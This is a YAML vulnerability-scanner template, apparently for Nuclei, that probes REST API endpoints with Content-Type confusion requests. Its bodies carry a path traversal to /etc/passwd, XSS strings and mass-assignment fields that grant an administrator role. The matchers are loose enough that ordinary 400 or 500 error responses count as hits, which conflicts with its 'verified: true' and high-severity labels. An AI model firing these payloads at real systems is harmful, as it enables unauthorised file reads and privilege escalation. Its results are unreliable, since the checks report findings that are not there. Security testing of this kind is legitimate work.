id: rest-api-content-type-bypass

info:
  name: REST API Content-Type Bypass - MIME Type Confusion Attacks
  author: elite-red-team
  severity: high
  description: |
    Advanced Content-Type bypass detection using MIME type confusion and parser differential attacks.
    Tests various content-type manipulation techniques to bypass input validation and security controls.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/
    - https://portswigger.net/web-security/request-smuggling
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 8.6
    cwe-id: CWE-436
  metadata:
    verified: true
    max-request: 20
  tags: api,content-type,bypass,mime,parser-confusion

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"
      - "{{BaseURL}}/api/v1/login"
      - "{{BaseURL}}/api/v1/register"

    headers:
      Content-Type: "text/plain"
      Accept: "application/json"

    body: '{"username": "admin", "password": "test", "role": "administrator", "admin": true}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 400
          - 500

      - type: word
        words:
          - "admin"
          - "administrator"
          - "success"
          - "created"
          - "error"
        condition: or
        case-insensitive: true

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"
      - "{{BaseURL}}/api/v1/data"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      Accept: "application/json"

    body: '{"injection": "test", "admin": true, "bypass": "content-type"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        words:
          - "syntax error"
          - "sql"
          - "database"
          - "mysql"
          - "postgresql"
          - "sqlite"
        condition: or
        case-insensitive: true

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/upload"
      - "{{BaseURL}}/api/v1/files"

    headers:
      Content-Type: "image/jpeg"
      Accept: "application/json"

    body: '{"file": "../../../etc/passwd", "path": "/etc/passwd", "type": "config"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "root:"
          - "daemon:"
          - "uploaded"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"

    headers:
      Content-Type: "application/xml"
      Accept: "application/json"

    body: '{"xss": "<script>alert(1)</script>", "html": "<img src=x onerror=alert(1)>"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "<script>"
          - "alert"
          - "onerror"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/config"
      - "{{BaseURL}}/api/v1/settings"

    headers:
      Content-Type: "text/xml"
      Accept: "application/json"

    body: '{"test": "bypass", "admin": true}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        words:
          - "admin"
          - "bypass"
          - "error"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"

    headers:
      Content-Type: "application/json; charset=utf-7"
      Accept: "application/json"

    body: '{"username": "admin", "role": "admin"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "admin"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/data"

    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary"
      Accept: "application/json"

    body: '{"boundary_bypass": true, "json_in_multipart": {"admin": true, "role": "administrator"}}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "admin"
          - "administrator"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"

    headers:
      Content-Type: "application/octet-stream"
      Accept: "application/json"

    body: '{"binary_bypass": true, "payload": "admin_access", "role": "administrator"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "admin"
          - "binary"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"

    headers:
      Content-Type: "text/csv"
      Accept: "application/json"

    body: '{"csv_bypass": "username,role admin,administrator", "injection": "test"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "admin"
          - "administrator"
          - "csv"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users"

    headers:
      Content-Type: "application/yaml"
      Accept: "application/json"

    body: '{"yaml": "username: admin role: administrator"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "admin"
          - "administrator"
          - "yaml"
        condition: or